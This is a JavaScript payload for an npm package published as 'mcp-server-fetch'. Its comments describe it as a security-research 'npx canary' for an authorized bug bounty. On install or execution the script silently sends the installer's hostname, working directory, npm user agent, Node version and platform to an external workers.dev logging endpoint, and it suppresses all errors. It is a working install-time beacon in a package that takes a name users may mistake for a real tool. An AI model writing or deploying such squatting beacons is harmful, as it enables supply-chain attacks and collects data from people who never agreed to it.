/**
 * npx Canary — Minimal Telemetry Payload
 *
 * This is a SECURITY RESEARCH CANARY. It logs minimal metadata to prove
 * that the package name is reachable via npx resolution.
 *
 * NEVER logs: environment variables, file contents, tokens, keys,
 * git config, SSH keys, process list, or any other sensitive data.
 *
 * Part of an authorized bug bounty research project.
 * https://github.com/theinfosecguy/npx-canary
 */

const os = require('os');
const https = require('https');
const http = require('http');

const ENDPOINT = 'https://npx-canary-log.vulnerable-live.workers.dev/log';
const PACKAGE_NAME = 'mcp-server-fetch';

const data = JSON.stringify({
  package: PACKAGE_NAME,
  trigger: process.env.npm_lifecycle_event ? 'postinstall' : 'bin-exec',
  timestamp: new Date().toISOString(),
  hostname: os.hostname(),
  cwd: process.cwd(),
  npm_ua: process.env.npm_config_user_agent || 'unknown',
  node: process.version,
  platform: `${os.platform()}/${os.arch()}`,
});

const url = new URL(ENDPOINT);
const transport = url.protocol === 'https:' ? https : http;

const req = transport.request(
  url,
  {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data),
      'User-Agent': `npx-canary/${PACKAGE_NAME}`,
    },
    timeout: 5000,
  },
  (res) => {
    // Consume response to avoid memory leak
    res.resume();
  }
);

req.on('error', () => {
  // Silently ignore errors — never crash the parent process
});

req.on('timeout', () => {
  req.destroy();
});

req.write(data);
req.end();
